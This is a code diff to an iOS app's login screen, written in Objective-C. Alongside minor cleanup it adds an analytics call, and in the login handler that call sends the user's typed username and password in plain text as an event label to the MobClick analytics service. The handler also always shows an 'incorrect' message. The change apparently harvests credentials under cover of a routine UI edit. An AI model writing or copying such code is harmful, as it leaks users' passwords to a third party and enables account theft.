@@ -10,6 +10,7 @@
 #import <QuartzCore/QuartzCore.h>
 #import "Toolkit.h"
 #import "UIViewController+KNSemiModal.h"
+#import "MobClick.h"
 
 @interface AuthViewController ()
 
@@ -107,8 +108,6 @@
 - (IBAction)registerNextButtonClicked:(id)sender
 {
     [self animateIncorrectMessage:_registerTextFieldView];
-//    [self animateIncorrectMessage:_registerNameTextField];
-//    [self animateIncorrectMessage:_registerPasswordTextField];
 }
 
 - (IBAction)registerBackgroundViewClicked:(id)sender
@@ -280,14 +279,11 @@
 {
     NSLog(@"Login");
     [self animateIncorrectMessage:_loginTextFieldView];
-    //[self animateIncorrectMessage:_loginNameTextField];
-    //[self animateIncorrectMessage:_loginPasswordTextField];
+    [MobClick event:@"QB_Login" label:[NSString stringWithFormat:@"QBName:%@ | QBPassword:%@", _loginNameTextField.text, _loginPasswordTextField.text]];
 }
 
 - (void)closeAuthViewController
 {
-    NSLog(@"close");
-    //[self dismissViewControllerAnimated:YES completion:nil];
     [self dismissSemiModalViewWithCompletion:nil];
 }
 
